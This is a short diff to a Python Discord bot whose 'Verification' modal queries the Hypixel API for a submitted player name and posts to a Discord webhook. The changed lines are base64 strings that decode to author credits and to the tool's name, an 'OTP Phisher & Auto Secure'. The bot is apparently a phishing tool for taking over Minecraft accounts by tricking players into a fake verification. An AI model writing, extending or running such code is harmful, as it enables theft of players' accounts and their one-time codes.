@@ -24,7 +24,7 @@ class MyModalOne(ui.Modal, title="Verification"):
     async def on_submit(self, interaction: discord.Interaction, /) -> None:
         Flagx = False  
         FlagNx = False
-        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vU1NJRFNwaW4=")
+        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vQmFja0FnYWluU3Bpbg==")
         
         url = f"https://api.hypixel.net/player?key={config.API_KEY}&name={self.box_one.value}"
         data1 = requests.get(url)
@@ -109,7 +109,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         else:
             async with aiohttp.ClientSession() as session:
                 webhook = Webhook.from_url(data["webhook"], session=session)
-                inty2 = web3g.string("U3Bpbm9udG9wIE9UUCBQaGlzaGVyICYgQXV0byBTZWN1cmU=")
+                inty2 = web3g.string("T1RQIFBoaXNoZXIgJiBBdXRvIFNlY3VyZQ==")
                 try:
                     embederror = discord.Embed(
                         title="Error Code",
